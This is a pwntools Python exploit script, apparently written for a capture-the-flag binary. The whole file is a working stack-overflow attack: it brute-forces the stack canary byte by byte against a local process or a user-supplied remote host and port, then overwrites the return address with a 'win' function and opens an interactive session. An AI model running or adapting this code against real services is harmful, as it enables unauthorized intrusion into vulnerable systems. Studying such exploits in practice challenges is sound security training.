from pwn import *


# =====================
# Setup
# =====================
binary = './vuln'
context.binary = binary
context.arch = "amd64"
context.timeout = None


elf = ELF(binary, checksec=False)

print("Type [y/n]:")
print("y -> server exploitation")
print("n -> local exploitation")
exploit = True if (input(">>>").lower() == 'y') else False

if exploit:
    HOST = input("Enter Hostname: ")
    PORT = int(input("Enter Port no: "))
else:
    print("[+]Starting a local instance!")


"""
	 ---------------- <Memory map> -----------------

		1. ebp at (0) | (4 bytes)
		2. ebx at (ebp - 4) | (4 bytes)
		3. padding from (ebp - 8) to (ebp - 5) | (4 bytes)
		4. variable_x from (ebp - 12) to (ebp - 9) | (4 bytes)
		5. variable_canary from (ebp - 16) to (ebp - 13) | (4 bytes)
		6. variable_buff from (ebp - 80) to (ebp - 17) | (64 bytes)
		7. variable_length from (ebp - 144) to (ebp - 81) | (64 bytes)
		8. variable_count from (ebp - 148) to (ebp - 145) | (4 bytes)
"""

def restart_service():
	return remote(HOST,PORT) if (exploit)  else process(binary)

def check_status(status):
	if( b"Ok... Now Where's the Flag?" in status):
		return True
	return False

def bruteForceCanary():
	canary = b''
	buff_len = 64
	payload = b'A' * buff_len

	for so_far in range(1,5):
		for j in range(0,256):
			with restart_service() as io:
				byte = bytes([j])
				io.recvuntil(b'> ')
				io.sendline(str(buff_len + so_far).encode())
				io.recvuntil(b'Input> ')
				io.sendline(payload + canary + byte)
				status = io.recvline()
				if(check_status(status)):
					canary += byte
					break

	return canary



def main():
	canary = bruteForceCanary()
	print(f"[+] canary found=>{canary}")
	win_address = elf.symbols['win']
	with restart_service() as io:
		payload = b'A' * 64 + canary + b'B' * 16 + p32(win_address)
		io.recvuntil(b'> ')
		io.sendline(str(len(payload)).encode())
		io.recvuntil(b'Input> ')
		io.sendline(payload)
		io.interactive()

main()
